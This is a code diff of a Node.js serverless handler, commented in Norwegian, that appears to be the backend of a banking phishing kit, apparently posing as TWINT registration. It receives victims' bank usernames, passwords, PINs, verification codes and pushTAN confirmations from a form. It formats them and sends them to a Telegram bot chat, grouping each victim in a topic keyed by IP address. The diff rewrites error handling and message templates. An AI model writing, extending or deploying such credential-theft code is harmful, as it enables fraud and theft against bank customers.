@@ -39,14 +39,8 @@ async function findExistingTopicForIP(ipAddress) {
 
       if (!response.ok) {
         const errorData = await response.json().catch(() => ({}));
-        const errorMsg = errorData.description || response.statusText || '';
-        // Hvis chat not found eller topics ikke støttes, returner null
-        if (errorMsg.includes('chat not found') || errorMsg.includes('Chat not found') || 
-            errorMsg.includes('not found')) {
-          console.log(`getForumTopics: Chat not found or topics not supported`);
-          return null;
-        }
-        console.log(`getForumTopics feilet: ${errorMsg}`);
+        // Hvis API ikke støtter getForumTopics eller feiler, returner null
+        console.log(`getForumTopics feilet: ${errorData.description || response.statusText}`);
         return null;
       }
 
@@ -140,14 +134,7 @@ async function createTopicForIP(ipAddress) {
   });
 
   if (!response.ok) {
-    const errorData = await response.json().catch(() => ({}));
-    const errorMsg = errorData.description || response.statusText || '';
-    
-    // Hvis chat not found, ikke prøv topics
-    if (errorMsg.includes('chat not found') || errorMsg.includes('Chat not found')) {
-      console.log(`createTopicForIP: Chat not found, topics ikke tilgjengelig`);
-      return null;
-    }
+    const errorData = await response.json();
     
     // Hvis topic allerede eksisterer (selv om vi ikke fant det), prøv å finne det igjen
     if (errorData.description && errorData.description.includes('already exists')) {
@@ -159,11 +146,10 @@ async function createTopicForIP(ipAddress) {
     }
     
     // Hvis topics ikke er støttet, returner null
-    if (errorData.error_code === 400 || errorMsg.includes('not supported') || errorMsg.includes('not a supergroup')) {
-      console.log(`Topics ikke støttet for denne chatten`);
-      return null;
+    if (errorData.error_code === 400) {
+      throw new Error('Topics ikke støttet - sjekk at gruppen er en supergruppe med topics aktivert');
     }
-    throw new Error(`Kunne ikke opprette topic: ${errorMsg}`);
+    throw new Error(`Kunne ikke opprette topic: ${errorData.description || response.statusText}`);
   }
 
   const result = await response.json();
@@ -197,19 +183,8 @@ async function sendToTelegram(chatId, message, topicId = null) {
   });
 
   if (!response.ok) {
-    const errorData = await response.json().catch(() => ({}));
-    const errorMessage = errorData.description || response.statusText || 'Unknown error';
-    
-    // If chat not found, provide helpful error message
-    if (errorMessage.includes('chat not found') || errorMessage.includes('Chat not found')) {
-      throw new Error(`Telegram chat not found. Please check:
-1. TELEGRAM_CHAT_ID is correct (should be a number or @username for groups)
-2. The bot is a member of the group/channel
-3. For groups, the group must be a supergroup (not a regular group)
-4. For topics, the group must have topics enabled`);
-    }
-    
-    throw new Error(`Telegram API error: ${errorMessage}`);
+    const errorData = await response.json();
+    throw new Error(`Telegram API error: ${errorData.description || response.statusText}`);
   }
 
   return await response.json();
@@ -219,7 +194,7 @@ async function sendToTelegram(chatId, message, topicId = null) {
  * Formaterer data til en lesbar Telegram-melding
  */
 function formatTelegramMessage(data, isNewIPAddress = false) {
-  const { action, bank, phone, telefonnummer, bank_username, bank_password, verification_code, auth_method, pin_attempt, pin, ip_adresse, timestamp } = data;
+  const { action, bank, phone, bank_username, bank_password, verification_code, auth_method, pin_attempt, pin, ip_adresse, timestamp } = data;
   
   let message = '';
   
@@ -296,44 +271,11 @@ function formatTelegramMessage(data, isNewIPAddress = false) {
       break;
 
     case 'bank_login':
-      message += `🔐 <b>Bank Login</b>\n`;
+      message += `🔐 <b>Ny TWINT Registrering</b>\n`;
       message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
+      message += `📱 <b>Telefon:</b> <code>${phone || 'N/A'}</code>\n`;
       message += `👤 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
       message += `🔑 <b>Passord:</b> <code>${bank_password || 'N/A'}</code>\n`;
-      if (data.save_device !== undefined) {
-        message += `💾 <b>Enhet lagret:</b> ${data.save_device ? 'Ja' : 'Nei'}\n`;
-      }
-      break;
-
-    case 'login_username_entered':
-      message += `👤 <b>Brukernavn Oppgitt</b>\n`;
-      message += `📝 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
-      if (telefonnummer) {
-        message += `📱 <b>Telefonnummer:</b> <code>${telefonnummer}</code>\n`;
-      }
-      break;
-
-    case 'pushTAN_confirmed':
-      message += `✅ <b>pushTAN Bekreftet</b>\n`;
-      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
-      message += `👤 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
-      message += `🔑 <b>Passord:</b> <code>${bank_password || 'N/A'}</code>\n`;
-      if (data.pushTAN_date_time) {
-        message += `⏰ <b>pushTAN Tid:</b> ${data.pushTAN_date_time}\n`;
-      }
-      break;
-
-    case 'login_failed':
-      message += `❌ <b>Login Feilet</b>\n`;
-      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
-      message += `👤 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
-      message += `🔑 <b>Passord:</b> <code>${bank_password || 'N/A'}</code>\n`;
-      if (data.error_message) {
-        message += `⚠️ <b>Feilmelding:</b> ${data.error_message}\n`;
-      }
-      if (data.save_device !== undefined) {
-        message += `💾 <b>Enhet lagret:</b> ${data.save_device ? 'Ja' : 'Nei'}\n`;
-      }
       break;
 
     default:
@@ -368,18 +310,8 @@ module.exports = async (req, res) => {
   try {
     // Valider at Telegram-konfigurasjonen er satt
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.error('Missing environment variables:', {
-        hasToken: !!TELEGRAM_BOT_TOKEN,
-        hasChatId: !!TELEGRAM_CHAT_ID
-      });
       throw new Error('TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID er ikke satt i miljøvariabler');
     }
-    
-    console.log('Telegram config check:', {
-      hasToken: !!TELEGRAM_BOT_TOKEN,
-      hasChatId: !!TELEGRAM_CHAT_ID,
-      chatIdType: typeof TELEGRAM_CHAT_ID
-    });
 
     // Get user data from request body
     let userData = req.body;
@@ -407,32 +339,29 @@ module.exports = async (req, res) => {
       ? forwardedFor.split(',')[0].trim() // Tar første IP hvis det er flere
       : req.headers['x-real-ip'] || req.connection?.remoteAddress || 'Ukjent IP';
 
-    // Formater meldingen
+    // Sjekk om dette er en ny IP-adresse før vi oppretter topic
+    const isNewIPAddress = !ipToTopicMap.has(ip_adresse);
+    
+    // Hent eller opprett topic for denne IP-adressen
+    const topicId = await getOrCreateTopicForIP(ip_adresse);
+
+    // Formater meldingen (inkluderer spesiell header hvis ny IP)
     const message = formatTelegramMessage({
       ...userData,
       ip_adresse,
-    }, false);
+    }, isNewIPAddress);
 
-    // Prøv å sende direkte til hovedkanalen først (uten topics)
-    // Dette sikrer at vi kan sende selv om topics ikke fungerer
-    try {
-      await sendToTelegram(TELEGRAM_CHAT_ID, message, null);
+    // Send til Telegram i riktig topic (hvis topicId er null, sendes det til hovedkanalen)
+    await sendToTelegram(TELEGRAM_CHAT_ID, message, topicId);
+
     console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);
 
     res.status(200).json({ 
       message: 'Data sendt til Telegram!',
       ip_adresse: ip_adresse 
     });
-    } catch (telegramError) {
-      console.error('Telegram send error:', telegramError);
-      // Hvis det fortsatt feiler, kast feilen
-      throw telegramError;
-    }
   } catch (error) {
     console.error('Telegram error:', error);
-    res.status(500).json({ 
-      message: `Serverfeil: ${error.message}`,
-      error: error.message
-    });
+    res.status(500).json({ message: `Serverfeil: ${error.message}` });
   }
 };
